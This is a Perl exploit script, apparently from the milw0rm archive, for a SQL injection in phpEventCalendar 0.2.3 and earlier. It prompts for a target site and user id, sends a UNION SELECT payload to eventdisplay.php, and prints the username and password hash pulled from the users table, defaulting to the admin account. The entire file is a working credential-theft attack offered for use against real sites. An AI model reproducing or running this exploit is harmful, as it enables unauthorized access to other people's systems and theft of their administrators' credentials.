#!/usr/bin/perl
#
#	Vendor url: www.ikemcg.com
#
require LWP::UserAgent;

print \"#
# phpEventCalendar <= v0.2.3 SQL Injection Exploit
# By Iron - ironwarez.info
# Thanks to Silentz for the help :)
# Greets to everyone at RootShell Security Group & dHack
#
# Example target url: http://www.target.com/phpeventcalendar/
Target url?\";
chomp($target=<stdin>);
if($target !~ /^http:\\/\\//)
{
	$target = \"http://\".$target;
}
if($target !~ /\\/$/)
{
	$target .= \"/\";
}
print \"User id to retrieve name/password from? (1 = admin)\";
chomp($target_id=<stdin>);
$target .= \"eventdisplay.php?id=-999%20UNION%20SELECT%20username,password,password%20FROM%20pec_users%20WHERE%20uid=\".$target_id;

$ua = LWP::UserAgent->new;
$ua->timeout(10);
$ua->env_proxy;

$response = $ua->get($target);

if ($response->is_success)
{
	if($response->content =~ /<span class=\"display_header\">(.*)<\\/span>/i)
	{
		($username,$password) = split(/,/,$1);
		print \"Username: \".$username;
		print \"\\nPassword: \".$password;
	}
	else
	{
		print \"\\nUnable to retrieve username/password.\";
	}
}
else
{
 die \"Error: \".$response->status_line;
}

# milw0rm.com [2007-07-01]
